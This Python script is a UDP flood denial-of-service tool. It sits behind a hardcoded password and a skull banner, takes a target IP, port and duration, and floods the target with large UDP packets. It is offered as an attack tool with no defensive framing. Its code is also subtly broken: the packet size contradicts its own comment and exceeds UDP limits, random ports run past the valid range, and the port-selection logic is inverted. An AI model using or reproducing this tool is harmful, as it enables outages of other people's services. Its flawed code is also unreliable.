import socket
import random
import sys
import time
import os

def clear_terminal():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def get_user_input():
    target_ip = input('Enter the target IP address: ')
    return target_ip

def authenticate(username, password):
    valid_username = "pacianoontop"
    valid_password = "pacianoontop"
    return username == valid_username and password == valid_password

def UDPFlooder():
    clear_terminal()
    print('''
         ...
     :::!~!!!!!:.
   .xUHWH!! !!?M88WHX:.
 .X*#M@$!!  !X!M$$$$$$WWx:.
:!!!!!!!?H! :!$!$$$$$$$$$$8X:
!!~  ~:~!! :~!$!#$$$$$$$$$$8X:
:!~::!H!<   ~.U$X!?R$$$$$$$$MM!
~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
  !:~~~ .:!M"T#$$$$WX??#MRRMMM!
  ~?WuxiW*`   `"#$$$$8!!!!??!!!
:X- M$$$$       `"T#$T~!8$WUXU~
:%`  ~#$$$m:        ~!~ ?$$$$$$
:!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
''')

    print("==== UDP Flooder ====")

    max_attempts = 3
    attempts = 0

    while attempts < max_attempts:
        username = input("Username: ")
        password = input("Password: ")

        if not authenticate(username, password):
            attempts += 1
            print(f"Wrong Password. {max_attempts - attempts} remaining chance(s).")
        else:
            clear_terminal()
            print("==== UDP Flooder ====")
            print("Logged in successfully.\n")
            break
    else:
        print("Nice try kiddo.")
        return

    target_ip = get_user_input()

    if not target_ip:
        print("Invalid input. Please provide the required information.")
        return

    target_port = input("Enter the target port (0=random): ")
    dur = input("Enter the duration in seconds (0=forever): ")

    if not target_port or not dur:
        print("Invalid input. Please provide all the required information.")
        return

    target_port = int(target_port)
    randport = (True, False)[target_port == 0]
    dur = int(dur)
    clock = (lambda: 0, time.time)[dur > 0]
    duration = (1, (clock() + dur))[dur > 0]
    print(f'\nStarting UDP Flood: {target_ip}:{target_port} for {dur or "infinite"} seconds')

    # Create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set the desired packet size (approx. 1 KB)
    packet_size_gb = 250
    packet = b'\x02\x00\x00\x00\x00\x00\x00\x00' * (packet_size_gb * 1024 // 8)

    try:
        while True:
            target_port = (random.randint(1, 15000000), target_port)[randport]
            if clock() < duration:
                # Send the packet to the server
                sock.sendto(packet, (target_ip, target_port))
            else:
                break
    except KeyboardInterrupt:
        print("\nStopping the UDP Flood...")
    finally:
        sock.close()

    print('UDP Flood DONE')

if __name__ == '__main__':
    UDPFlooder()
